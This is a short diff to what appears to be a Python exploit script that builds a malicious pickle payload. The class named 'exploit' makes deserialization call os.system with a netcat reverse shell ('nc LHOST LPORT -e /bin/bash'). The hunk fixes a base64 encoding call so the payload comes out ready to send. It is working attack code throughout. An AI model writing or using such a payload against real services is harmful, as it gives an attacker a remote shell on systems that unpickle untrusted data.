@@ -11,6 +11,6 @@ class exploit:
         return(os.system, (f'nc {LHOST} {LPORT} -e /bin/bash',) )
 
 serialized = pickle.dumps(exploit())
-final = base64.b64encoded(serialized)
+final = base64.b64encode(serialized)
 
 print(final)
